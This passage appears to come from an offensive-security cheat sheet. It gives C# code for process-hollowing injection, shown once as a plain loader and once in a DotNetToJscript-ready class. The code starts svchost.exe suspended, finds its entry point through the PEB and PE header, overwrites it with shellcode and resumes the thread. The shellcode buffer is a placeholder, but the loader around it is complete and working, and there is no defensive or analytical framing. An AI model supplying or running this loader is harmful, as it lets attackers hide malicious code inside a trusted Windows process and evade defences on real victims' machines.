            IntPtr nRead = IntPtr.Zero;
            byte[] data = new byte[0x200];

            // Create suspended process
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, 
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi
            );

            // Get proc handle
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            // Get prt to svchost.exe image base
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            // Get addr of code base
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            // Parse PE header to get entrypoint
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // Shellcode here...
            // byte[] buf = new byte[510] { ... };

            // Overwrite process memory with shellcode
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            // Resume suspended process
            ResumeThread(pi.hThread);
        }
    }
}
```
</details>

<details>
<summary><h5>DotNetToJscript Format</h5></summary>

```
// Check your imports
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    struct STARTUPINFO{
        public Int32 cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION{
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION{
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern bool CreateProcess(
        string lpApplicationName, 
        string lpCommandLine, 
        IntPtr lpProcessAttributes, 
        IntPtr lpThreadAttributes, 
        bool bInheritHandles, 
        uint dwCreationFlags, 
        IntPtr lpEnvironment, 
        string lpCurrentDirectory, 
        [In] ref STARTUPINFO lpStartupInfo, 
        out PROCESS_INFORMATION lpProcessInformation
    );
    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwQueryInformationProcess(
        IntPtr hProcess, 
        int procInformationClass, 
        ref PROCESS_BASIC_INFORMATION procInformation, 
        uint ProcInfoLen, ref uint retlen
    );
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(
        IntPtr hProcess, 
        IntPtr lpBaseAddress, 
        [Out] byte[] lpBuffer,
        int dwSize, 
        out IntPtr lpNumberOfBytesRead
        );
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(
        IntPtr hProcess, 
        IntPtr lpBaseAddress, 
        byte[] lpBuffer, 
        Int32 nSize, 
        out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr hThread);

    public TestClass()
    {
        // Variable declaration
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        byte[] addrBuf = new byte[IntPtr.Size];
        IntPtr nRead = IntPtr.Zero;
        byte[] data = new byte[0x200];

        // Create suspended process
        bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, 
            IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi
        );

        // Get proc handle
        IntPtr hProcess = pi.hProcess;
        ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

        // Get prt to svchost.exe image base
        IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

        // Get addr of code base
        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
        IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

        // Parse PE header to get entrypoint
        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
        uint opthdr = e_lfanew_offset + 0x28;
        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

        // Shellcode here...
        // byte[] buf = new byte[510] { ... };

        // Overwrite process memory with shellcode
        WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

        // Resume suspended process
        ResumeThread(pi.hThread);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```
</details>
</details>
